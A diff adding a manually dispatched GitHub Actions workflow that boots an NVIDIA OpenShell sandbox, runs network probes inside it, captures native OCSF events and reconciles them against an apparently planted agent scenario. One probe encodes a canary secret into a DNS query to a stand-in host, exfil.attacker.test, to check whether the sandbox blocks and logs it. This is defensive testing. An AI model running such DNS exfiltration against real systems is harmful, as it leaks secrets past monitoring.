@@ -1,0 +1,453 @@
+name: OpenShell Live (experimental)
+
+# EXPERIMENTAL, dispatch-only. Owner-ordered live measurement: try to
+# boot a real NVIDIA OpenShell sandbox on a GitHub-hosted runner (which
+# has Docker, unlike the factory VM), run network actions inside it,
+# capture the REAL native OCSF stream, and run the repo's own ingest +
+# two-source reconciliation over that native data. This workflow is not
+# part of CI: it never runs on push/PR and changes no existing behavior.
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+concurrency:
+  group: openshell-live
+  cancel-in-progress: false
+
+jobs:
+  openshell-live:
+    name: Boot OpenShell sandbox + native OCSF capture + reconcile
+    runs-on: ubuntu-latest
+    timeout-minutes: 90
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
+        with:
+          python-version: "3.12"
+
+      - name: Prepare evidence dir + install OPA (pinned, as in CI)
+        run: |
+          mkdir -p "$RUNNER_TEMP/oslive/stage"
+          echo "OSLIVE=$RUNNER_TEMP/oslive" >> "$GITHUB_ENV"
+          curl -sL --fail -o /tmp/opa https://openpolicyagent.org/downloads/v1.21.3/opa_linux_amd64_static
+          echo "add7c9dcf56e1ce1538426a6ee595ea1cc7ee830bbedd4c23219825b02b19a79  /tmp/opa" | sha256sum -c -
+          chmod +x /tmp/opa
+          /tmp/opa version
+
+      - name: Environment recon (docker, kernel, landlock)
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          {
+            echo "== uname =="; uname -a
+            echo "== docker version =="; docker version || true
+            echo "== docker server version =="; docker version --format '{{.Server.Version}}' || true
+            echo "== docker ps =="; docker ps || true
+            echo "== socket =="; ls -la /var/run/docker.sock || true
+            echo "== landlock =="; grep -i landlock /sys/kernel/security/lsm 2>/dev/null || cat /sys/kernel/security/lsm 2>/dev/null || echo "no lsm file"
+            echo "== python =="; python3 --version
+          } | tee "$OSLIVE/recon.txt"
+
+      - name: Ensure Docker Engine >= 28 (docker driver requirement)
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          SRV="$(docker version --format '{{.Server.Version}}' 2>/dev/null || echo 0)"
+          MAJOR="${SRV%%.*}"
+          echo "docker server: $SRV (major $MAJOR)" | tee "$OSLIVE/docker-version.txt"
+          if [ "${MAJOR:-0}" -lt 28 ] 2>/dev/null; then
+            echo "Upgrading Docker via get.docker.com ..."
+            curl -fsSL https://get.docker.com -o /tmp/get-docker.sh
+            sudo sh /tmp/get-docker.sh || true
+            sudo systemctl restart docker || sudo service docker restart || true
+            sleep 5
+            docker version | tee -a "$OSLIVE/docker-version.txt" || true
+          fi
+
+      - name: Install OpenShell (official installer) + dump CLI help
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          curl -LsSf https://raw.githubusercontent.com/NVIDIA/OpenShell/main/install.sh -o /tmp/openshell-install.sh
+          sh /tmp/openshell-install.sh 2>&1 | tee "$OSLIVE/install.log" || true
+          export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+          echo "$HOME/.local/bin" >> "$GITHUB_PATH"
+          {
+            echo "== which =="; command -v openshell || true; command -v openshell-gateway || true
+            echo "== version =="; openshell --version || true
+            echo "== dpkg -L openshell =="; dpkg -L openshell 2>/dev/null || true
+            echo "== dpkg -l =="; dpkg -l | grep -i openshell || true
+            echo "== home files =="; ls -la "$HOME/.config/openshell" 2>/dev/null || true; ls -la "$HOME/.local/state/openshell" 2>/dev/null || true
+          } | tee "$OSLIVE/install-recon.txt"
+          {
+            for c in "--help" "gateway --help" "sandbox --help" "sandbox create --help" "sandbox exec --help" "sandbox get --help" "logs --help" "settings --help" "status --help" "gateway add --help"; do
+              echo "##### openshell $c"; openshell $c 2>&1 || true
+            done
+          } > "$OSLIVE/cli-help.txt" 2>&1 || true
+          head -100 "$OSLIVE/cli-help.txt"
+
+      - name: Configure docker driver + start gateway
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+          mkdir -p "$HOME/.config/openshell"
+          printf 'OPENSHELL_DRIVERS=docker\nDOCKER_HOST=unix:///var/run/docker.sock\n' > "$HOME/.config/openshell/gateway.env"
+          cat "$HOME/.config/openshell/gateway.env"
+          # Find the systemd unit (if the .deb shipped one) and record it.
+          UNIT="$(dpkg -L openshell 2>/dev/null | grep -Ei '\.service$' | head -1 || true)"
+          echo "unit file: ${UNIT:-none}" | tee "$OSLIVE/gateway-recon.txt"
+          if [ -n "${UNIT:-}" ] && [ -f "$UNIT" ]; then cat "$UNIT" | tee -a "$OSLIVE/gateway-recon.txt"; fi
+          # Attempt 1: maybe the installer already started it.
+          if openshell status 2>&1 | tee "$OSLIVE/gateway-status-1.txt" | grep -qi "connected"; then
+            touch "$OSLIVE/stage/gateway.ok"; echo "gateway already connected"
+          fi
+          # Attempt 2: systemd user service.
+          if [ ! -f "$OSLIVE/stage/gateway.ok" ]; then
+            systemctl --user daemon-reload 2>&1 | tee -a "$OSLIVE/gateway-recon.txt" || true
+            for svc in openshell-gateway openshell; do
+              systemctl --user start "$svc" 2>&1 | tee -a "$OSLIVE/gateway-recon.txt" || true
+            done
+            sleep 5
+            if openshell status 2>&1 | tee "$OSLIVE/gateway-status-2.txt" | grep -qi "connected"; then
+              touch "$OSLIVE/stage/gateway.ok"; echo "gateway up via systemd user service"
+            fi
+          fi
+          # Attempt 3: run the gateway binary directly, following the unit
+          # file's ExecStartPre / ExecStart lines when discoverable.
+          if [ ! -f "$OSLIVE/stage/gateway.ok" ]; then
+            GW_BIN="$(command -v openshell-gateway || ls /usr/bin/openshell-gateway /usr/lib/openshell/openshell-gateway /opt/openshell/openshell-gateway 2>/dev/null | head -1 || true)"
+            echo "gateway binary: ${GW_BIN:-none}" | tee -a "$OSLIVE/gateway-recon.txt"
+            if [ -n "${UNIT:-}" ] && [ -f "$UNIT" ]; then
+              grep -E '^ExecStartPre' "$UNIT" | sed 's/^ExecStartPre=-*//' | while read -r line; do
+                echo "ExecStartPre: $line"; eval "$line" || true
+              done
+              EXEC_LINE="$(grep -E '^ExecStart=' "$UNIT" | head -1 | sed 's/^ExecStart=-*//')"
+              echo "ExecStart: $EXEC_LINE" | tee -a "$OSLIVE/gateway-recon.txt"
+              if [ -n "$EXEC_LINE" ]; then
+                set -a; . "$HOME/.config/openshell/gateway.env" 2>/dev/null || true; set +a
+                nohup bash -c "$EXEC_LINE" > "$OSLIVE/gateway-manual.log" 2>&1 &
+              fi
+            elif [ -n "${GW_BIN:-}" ]; then
+              set -a; . "$HOME/.config/openshell/gateway.env" 2>/dev/null || true; set +a
+              "$GW_BIN" --help > "$OSLIVE/gateway-bin-help.txt" 2>&1 || true
+              nohup "$GW_BIN" > "$OSLIVE/gateway-manual.log" 2>&1 &
+            fi
+            # Register/select a local gateway if the CLI needs it.
+            sleep 5
+            openshell gateway add http://127.0.0.1:18080 --local --name local 2>&1 | tee -a "$OSLIVE/gateway-recon.txt" || true
+            openshell gateway select local 2>&1 | tee -a "$OSLIVE/gateway-recon.txt" || true
+            for i in $(seq 1 36); do
+              if openshell status 2>&1 | tee "$OSLIVE/gateway-status-3.txt" | grep -qi "connected"; then
+                touch "$OSLIVE/stage/gateway.ok"; echo "gateway connected (attempt 3, poll $i)"; break
+              fi
+              sleep 5
+            done
+          fi
+          echo "== final status =="; openshell status 2>&1 | tee "$OSLIVE/gateway-status-final.txt" || true
+          echo "== gateway log tail =="; tail -50 "$OSLIVE/gateway-manual.log" 2>/dev/null || true
+          if [ -f "$OSLIVE/stage/gateway.ok" ]; then echo "GATEWAY_OK=1"; else echo "GATEWAY_OK=0"; fi
+
+      - name: Enable native OCSF JSON export (supervisor stderr)
+        if: always()
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+          if [ -f "$OSLIVE/stage/gateway.ok" ]; then
+            openshell settings set --global --key ocsf_json_enabled --value true 2>&1 | tee "$OSLIVE/ocsf-setting.txt" || true
+          else
+            echo "gateway not connected; skipped" | tee "$OSLIVE/ocsf-setting.txt"
+          fi
+
+      - name: Create sandbox (docker driver) and poll to Ready
+        if: always()
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+          if [ ! -f "$OSLIVE/stage/gateway.ok" ]; then
+            echo "gateway not connected; sandbox create skipped" | tee "$OSLIVE/sandbox-create.txt"; exit 0
+          fi
+          timeout 1200 openshell sandbox create --name oslive --detach --output json 2>&1 | tee "$OSLIVE/sandbox-create.txt"
+          for i in $(seq 1 45); do
+            OUT="$(openshell sandbox get oslive --output json 2>&1 || openshell sandbox list 2>&1 || true)"
+            echo "poll $i: $OUT" | tee -a "$OSLIVE/sandbox-poll.txt"
+            if echo "$OUT" | grep -qiE '"(status|state)"\s*:\s*"(ready|running|active)"|Ready|Running'; then
+              touch "$OSLIVE/stage/sandbox.ok"; echo "SANDBOX_BOOTED=1"; break
+            fi
+            if echo "$OUT" | grep -qiE '"(status|state)"\s*:\s*"(error|failed)"'; then
+              echo "sandbox entered error state"; break
+            fi
+            sleep 20
+          done
+          openshell sandbox list 2>&1 | tee "$OSLIVE/sandbox-list.txt" || true
+          docker ps -a 2>&1 | tee "$OSLIVE/docker-ps-after-create.txt" || true
+          [ -f "$OSLIVE/stage/sandbox.ok" ] && echo "SANDBOX_BOOTED=1" || echo "SANDBOX_BOOTED=0"
+
+      - name: Run actions inside the sandbox (DNS + egress probes)
+        if: always()
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+          mkdir -p "$OSLIVE/exec"
+          if [ ! -f "$OSLIVE/stage/sandbox.ok" ]; then echo "sandbox not booted; exec probes skipped"; exit 0; fi
+          EXFIL="$(python3 -c "import base64;print(base64.b32encode(b'CANARY-SECRET-7f3a9d2e').decode().rstrip('=').lower())").exfil.attacker.test"
+          echo "$EXFIL" > "$OSLIVE/exfil-qname.txt"
+          echo "exfil qname: $EXFIL"
+          run_exec() {
+            name="$1"; shift
+            echo "### $name :: $*" | tee "$OSLIVE/exec/$name.txt"
+            timeout 90 openshell sandbox exec oslive -- "$@" >> "$OSLIVE/exec/$name.txt" 2>&1
+            echo "exit=$?" >> "$OSLIVE/exec/$name.txt"
+            cat "$OSLIVE/exec/$name.txt"
+          }
+          run_exec 01-identity id
+          run_exec 02-python python3 --version
+          run_exec 03-file sh -c 'echo seatbelt-live-probe > /tmp/probe.txt && cat /tmp/probe.txt'
+          run_exec 04-dns-public getent hosts api.github.com
+          run_exec 05-dns-public-dig dig +time=5 +tries=1 api.github.com
+          run_exec 06-dns-exfil python3 -c "import socket,sys
+          try:
+              print(socket.getaddrinfo('$EXFIL', 443))
+          except Exception as e:
+              print('EXFIL-DNS-ERROR', type(e).__name__, e)"
+          run_exec 07-dns-exfil-dig dig +time=5 +tries=1 "$EXFIL"
+          run_exec 08-dns-ext-1111 dig +time=5 +tries=1 @1.1.1.1 example.com
+          run_exec 09-dns-ext-8888 dig +time=5 +tries=1 @8.8.8.8 example.com
+          run_exec 10-egress-github curl -m 15 -sS -o /dev/null -w 'http_code=%{http_code}\n' https://api.github.com/zen
+          run_exec 11-egress-example curl -m 15 -sS -o /dev/null -w 'http_code=%{http_code}\n' http://example.com/
+          echo "letting logs flush ..."; sleep 20
+
+      - name: Capture native OCSF (supervisor stderr + openshell logs)
+        if: always()
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+          docker ps -a --format '{{.ID}} {{.Names}} {{.Image}} {{.Status}}' | tee "$OSLIVE/docker-ps-all.txt" || true
+          mkdir -p "$OSLIVE/container-logs"
+          for cid in $(docker ps -a --format '{{.ID}} {{.Names}}' | grep -iE 'openshell|oslive|supervisor|sandbox' | awk '{print $1}'); do
+            cname="$(docker inspect --format '{{.Name}}' "$cid" 2>/dev/null | tr -d '/' || echo "$cid")"
+            echo "dumping logs for $cid ($cname)"
+            docker logs "$cid" > "$OSLIVE/container-logs/$cname.log" 2>&1 || true
+            docker exec "$cid" ls -la /var/log >> "$OSLIVE/container-logs/$cname.log" 2>&1 || true
+          done
+          # Extract full OCSF JSON records from supervisor stderr markers.
+          grep -h 'OCSF-JSON ' "$OSLIVE"/container-logs/*.log 2>/dev/null | sed 's/.*OCSF-JSON //' > "$OSLIVE/native-ocsf-raw.ndjson" || true
+          python3 - "$OSLIVE" <<'PYEOF'
+          import json, os, sys
+          oslive = sys.argv[1]
+          raw = os.path.join(oslive, "native-ocsf-raw.ndjson")
+          good, bad = [], 0
+          if os.path.exists(raw):
+              for line in open(raw, encoding="utf-8"):
+                  line = line.strip()
+                  if not line:
+                      continue
+                  try:
+                      good.append(json.loads(line))
+                  except Exception:
+                      bad += 1
+          with open(os.path.join(oslive, "native-ocsf.ndjson"), "w", encoding="utf-8") as fh:
+              for ev in good:
+                  fh.write(json.dumps(ev) + "\n")
+          inv = {}
+          for ev in good:
+              inv[str(ev.get("class_uid"))] = inv.get(str(ev.get("class_uid")), 0) + 1
+          print(json.dumps({"native_events_valid": len(good), "unparseable_lines": bad, "by_class_uid": inv}, indent=2))
+          with open(os.path.join(oslive, "native-inventory.json"), "w") as fh:
+              json.dump({"valid": len(good), "bad": bad, "by_class_uid": inv}, fh, indent=2)
+          PYEOF
+          timeout 30 openshell logs oslive --source sandbox > "$OSLIVE/openshell-logs.txt" 2>&1 || true
+          echo "== shorthand DENIED/NET lines =="
+          grep -hE 'DENIED|OCSF' "$OSLIVE/openshell-logs.txt" | head -40 || true
+
+      - name: Boundary run (seatbelt planted) + REAL native ingest + reconcile
+        if: always()
+        env:
+          SEATBELT_OPA_BIN: /tmp/opa
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          cat > "$OSLIVE/boundary_driver.py" <<'PYEOF'
+          import json, os, subprocess, sys, time
+          ROOT = os.environ["GITHUB_WORKSPACE"]
+          SRC = os.path.join(ROOT, "src")
+          sys.path.insert(0, SRC)
+          OSLIVE = os.environ["OSLIVE"]
+          BASE = os.path.join(OSLIVE, "boundary")
+          OPA = os.environ.get("SEATBELT_OPA_BIN", "/tmp/opa")
+          DEMO_SECRET = "DEMO-SECRET-billing-9c1f"
+          CANARY = "CANARY-SECRET-7f3a9d2e"
+          from seatbelt.coverage import run_coverage
+          from seatbelt.ingest import ingest_file
+          from seatbelt.ledger import Ledger, load_signing_key, read_records
+
+          def base_env(extra=None):
+              env = dict(os.environ); env["PYTHONPATH"] = SRC
+              if extra: env.update(extra)
+              return env
+
+          def stop(proc):
+              import signal
+              try:
+                  os.killpg(proc.pid, signal.SIGINT); proc.wait(timeout=10)
+              except Exception:
+                  try: os.killpg(proc.pid, signal.SIGKILL)
+                  except Exception: pass
+
+          summary = {"stage": "init"}
+          target = subprocess.Popen(
+              [sys.executable, os.path.join(ROOT, "examples/ops-assistant/target_server.py"), "0"],
+              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
+              env=base_env({"SEATBELT_SECRET_BILLING_API": DEMO_SECRET}),
+              start_new_session=True)
+          try:
+              line = target.stdout.readline()
+              target_port = int(line.strip().rsplit(" ", 1)[1])
+              summary["target_port"] = target_port
+              run_dir = os.path.join(BASE, "run")
+              anchor_file = os.path.join(BASE, "anchors", "anchors.ndjson")
+              state_file = os.path.join(BASE, "state.json")
+              key_file = os.path.join(BASE, "operator-key.txt")
+              workspace = os.path.join(BASE, "ws")
+              home = os.path.join(BASE, "home")
+              gt_path = os.path.join(BASE, "ground-truth.ndjson")
+              transcript_path = os.path.join(BASE, "transcript.json")
+              for d in (run_dir, os.path.dirname(anchor_file), workspace, home):
+                  os.makedirs(d, exist_ok=True)
+              daemon = subprocess.Popen(
+                  [sys.executable, "-m", "seatbelt.cli", "serve",
+                   "--run-dir", run_dir, "--run-id", "run-openshell-live-planted",
+                   "--adapter", "openshell", "--workspace", workspace,
+                   "--policies", os.path.join(ROOT, "policies"),
+                   "--opa-bin", OPA, "--key-file", key_file,
+                   "--anchor-dir", os.path.dirname(anchor_file),
+                   "--state-file", state_file],
+                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                  env=base_env({"SEATBELT_SECRET_BILLING_API": DEMO_SECRET}),
+                  start_new_session=True)
+              try:
+                  for _ in range(150):
+                      if os.path.exists(state_file): break
+                      if daemon.poll() is not None: raise RuntimeError("daemon exited early")
+                      time.sleep(0.1)
+                  summary["stage"] = "daemon_up"
+                  proc = subprocess.run(
+                      [sys.executable, os.path.join(ROOT, "examples/ops-assistant/agent.py"),
+                       "--mode", "openshell", "--scenario", "planted",
+                       "--state-file", state_file, "--workspace", workspace,
+                       "--ground-truth", gt_path, "--transcript", transcript_path,
+                       "--target-port", str(target_port), "--canary", CANARY],
+                      capture_output=True, text=True,
+                      env=base_env({"HOME": home}), timeout=300)
+                  summary["agent_stdout"] = proc.stdout.strip()
+                  summary["agent_rc"] = proc.returncode
+                  if proc.returncode != 0:
+                      summary["agent_stderr_tail"] = proc.stderr[-800:]
+              finally:
+                  stop(daemon)
+              summary["stage"] = "agent_done"
+              report = run_coverage(run_dir, gt_path, key_file, "ops-assistant",
+                                    "openshell", anchor_path=anchor_file)
+              summary["coverage"] = {"verdict": report["verdict"],
+                                     "expected": report["expected"],
+                                     "recorded": report["recorded"],
+                                     "missing": report["missing"]}
+              summary["stage"] = "coverage_done"
+              native = os.path.join(OSLIVE, "native-ocsf.ndjson")
+              n = 0
+              if os.path.exists(native) and os.path.getsize(native) > 0:
+                  ledger = Ledger(os.path.join(run_dir, "ledger.ndjson"), anchor_file,
+                                  load_signing_key(key_file),
+                                  "run-openshell-live-planted",
+                                  "ops-assistant", "openshell", resume=True)
+                  n = ingest_file(ledger, native, "ocsf")
+                  ledger.checkpoint(); ledger.close()
+              summary["native_ingested"] = n
+              summary["ledger_records_total"] = len(read_records(os.path.join(run_dir, "ledger.ndjson")))
+              rec = subprocess.run(
+                  [sys.executable, os.path.join(ROOT, "adapters/openshell/reconcile.py"),
+                   "--ledger", os.path.join(run_dir, "ledger.ndjson"),
+                   "--out", os.path.join(BASE, "reconciliation-live.json")],
+                  capture_output=True, text=True)
+              summary["reconcile_rc"] = rec.returncode
+              summary["reconcile_stdout"] = rec.stdout.strip()
+              summary["stage"] = "done"
+          finally:
+              stop(target)
+          print(json.dumps(summary, indent=2))
+          with open(os.path.join(BASE, "boundary-summary.json"), "w") as fh:
+              json.dump(summary, fh, indent=2)
+          PYEOF
+          python3 "$OSLIVE/boundary_driver.py" 2>&1 | tee "$OSLIVE/boundary-driver.log" || true
+
+      - name: Sorami checks + final summary
+        if: always()
+        run: |
+          OSLIVE="$RUNNER_TEMP/oslive"
+          python3 - "$OSLIVE" <<'PYEOF'
+          import json, os, sys
+          oslive = sys.argv[1]
+          def load(p):
+              try:
+                  with open(os.path.join(oslive, p)) as fh: return json.load(fh)
+              except Exception: return None
+          exfil = ""
+          p = os.path.join(oslive, "exfil-qname.txt")
+          if os.path.exists(p): exfil = open(p).read().strip()
+          native = load("native-inventory.json") or {"valid": 0, "by_class_uid": {}}
+          blob = ""
+          nd = os.path.join(oslive, "native-ocsf.ndjson")
+          if os.path.exists(nd): blob = open(nd, encoding="utf-8").read()
+          logs = ""
+          lp = os.path.join(oslive, "openshell-logs.txt")
+          if os.path.exists(lp): logs = open(lp, encoding="utf-8", errors="replace").read()
+          clog = ""
+          cl = os.path.join(oslive, "container-logs")
+          if os.path.isdir(cl):
+              for f in sorted(os.listdir(cl)):
+                  clog += open(os.path.join(cl, f), encoding="utf-8", errors="replace").read()
+          boundary = load("boundary/boundary-summary.json") or {}
+          rec = load("boundary/reconciliation-live.json")
+          s1_exfil_in_native = bool(exfil) and (exfil in blob or exfil in logs or exfil in clog)
+          s1_ext_dns_in_native = any(ip in blob or ip in logs or ip in clog for ip in ("1.1.1.1", "8.8.8.8"))
+          summary = {
+            "sandbox_booted": os.path.exists(os.path.join(oslive, "stage/sandbox.ok")),
+            "gateway_connected": os.path.exists(os.path.join(oslive, "stage/gateway.ok")),
+            "native_ocsf": native,
+            "sorami_1_blocked_dns_leaves_event": {
+                "exfil_qname": exfil,
+                "exfil_event_in_any_native_source": s1_exfil_in_native,
+                "external_resolver_attempt_in_any_native_source": s1_ext_dns_in_native,
+                "dns_class_4003_events": native.get("by_class_uid", {}).get("4003", 0)},
+            "sorami_2_ocsf_export_writes": {
+                "ocsf_json_records_from_supervisor_stderr": native.get("valid", 0),
+                "export_produced_records": native.get("valid", 0) > 0},
+            "sorami_3_coverage_reconciliation": {
+                "boundary_coverage": boundary.get("coverage"),
+                "native_ingested": boundary.get("native_ingested"),
+                "reconciliation": rec},
+            "boundary_agent": boundary.get("agent_stdout"),
+          }
+          print(json.dumps(summary, indent=2))
+          with open(os.path.join(oslive, "summary.json"), "w") as fh:
+              json.dump(summary, fh, indent=2)
+          PYEOF
+          echo "===== KEY FILES ====="
+          for f in summary.json native-inventory.json boundary/boundary-summary.json boundary/reconciliation-live.json sandbox-create.txt gateway-status-final.txt; do
+            echo "----- $f -----"; cat "$OSLIVE/$f" 2>/dev/null | head -60 || true
+          done
+          echo "----- native-ocsf.ndjson (first 10) -----"
+          head -10 "$OSLIVE/native-ocsf.ndjson" 2>/dev/null || true
+
+      - name: Cleanup sandbox
+        if: always()
+        run: |
+          export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
+          openshell sandbox delete oslive 2>&1 || true
+          docker ps -a || true
+
+      - name: Upload evidence artifact
+        if: always()
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        with:
+          name: openshell-live-evidence
+          path: ${{ runner.temp }}/oslive
+          if-no-files-found: warn
